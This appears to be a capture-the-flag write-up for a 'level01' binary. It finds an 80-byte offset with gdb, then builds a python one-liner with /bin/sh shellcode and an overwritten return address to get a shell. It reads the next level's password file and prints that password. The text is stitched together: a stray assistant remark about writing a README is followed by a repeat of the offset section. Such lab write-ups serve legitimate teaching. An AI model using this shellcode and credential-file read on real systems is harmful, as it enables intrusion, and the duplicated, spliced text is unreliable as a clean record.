
# Level01 Challenge Solution

### . Determine the Offset
Using `gdb` with a cyclic pattern:
```bash
gdb ./level01
pwndbg> cyclic 200
pwndbg> run
# Enter username: "dat_wil"
# Enter password: [cyclic pattern]
```
The program crashes at `0x61616175` ("uaaa"):
```bash
pwndbg> cyclic -l uaaa
80
```
**Offset to EIP: 80 bytes**

## Exploit Summary
This exploit bypasses authentication and spawns a shell by:
1. Passing the username check with `"dat_wil"`
2. Injecting shellcode into memory
3. Overflowing the password buffer to hijack execution

## Modified Exploit Command
```python
python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'B'*80 + '\x47\xa0\x04\x08'" > /tmp/abderrafie
```

### Key Changes:
1. **Output File**: `/tmp/abderrafie` (formerly `/tmp/inj01`)
2. **Padding**: Replaced cyclic pattern with `'B'*80` for simplicity

## Components Explained

| Part | Content | Purpose |
|------|---------|---------|
| Username | `dat_wil` | Bypasses the username check |
| Shellcode | `\x6a\x0b\x58...` | Spawns `/bin/sh` (23 bytes) |
| Newline | `\n` | Separates username/password inputs |
| Padding | `'B'*80` | Fills buffer until EIP overwrite |
| EIP | `\x47\xa0\x04\x08` | Jumps to shellcode at `0x0804a047` |

## Execution
```bash
cat /tmp/abderrafie - | ./level01
```
- **Expected Result**: Opens a shell with `level02` privileges

## Post-Exploit
Retrieve the password for the next level:
```bash
cat /home/users/level02/.pass
```

---

### the password for the next level is:
```
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```





Here's a **detailed README.md** for your `level01` challenge based on the exploit you developed:

---


### 1. Determine the Offset
Using `gdb` with a cyclic pattern:
```bash
gdb ./level01
pwndbg> cyclic 200
pwndbg> run
# Enter username: "dat_wil"
# Enter password: [cyclic pattern]
```
The program crashes at `0x61616175` ("uaaa"):
```bash
pwndbg> cyclic -l uaaa
80
```
**Offset to EIP: 80 bytes**

---

